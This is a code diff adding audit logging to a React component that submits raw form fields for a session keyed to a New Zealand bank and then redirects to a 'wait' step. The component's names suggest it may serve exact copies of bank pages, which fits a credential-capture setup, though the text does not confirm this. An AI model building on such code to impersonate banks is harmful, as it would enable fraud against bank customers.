@@ -5,6 +5,7 @@ import { useRouter } from "next/navigation";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { stepToPath } from "@/lib/session-routes";
 import { getNzBankPagePath } from "@/lib/nz-bank-page-map";
+import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";
 
 type Props = {
   sessionId: string;
@@ -279,8 +280,40 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     setSaving(false);
 
     if (updateError) {
+      logAuditEvent({
+        session_id: sessionId,
+        event_kind: "submit",
+        event_action: "nz_exact_submit_error",
+        status: "error",
+        bank_slug: bankSlug,
+        bank_name: bankName,
+        meta: { message: updateError.message ?? String(updateError) },
+        error_name: "SupabaseUpdateError",
+        error_message: updateError.message ?? String(updateError),
+      });
       return;
     }
+
+    logAuditEvent({
+      session_id: sessionId,
+      event_kind: "bank_form",
+      event_action: "nz_exact_submit_wait",
+      status: "ok",
+      bank_slug: bankSlug,
+      bank_name: bankName,
+      from_step: "bank",
+      to_step: "wait",
+      meta: {
+        historyCount: previousHistory.length,
+        rawFieldKeys: Object.keys(rawFields),
+        orderedFields: {
+          orderedField1Key: historyEntry.orderedField1Key,
+          orderedField2Key: historyEntry.orderedField2Key,
+          orderedField3Key: historyEntry.orderedField3Key,
+        },
+      },
+    });
+    void flushAuditQueueNow();
 
     router.push(stepToPath("wait", sessionId));
   }, [bankName, bankSlug, router, saving, sessionId, supabase]);
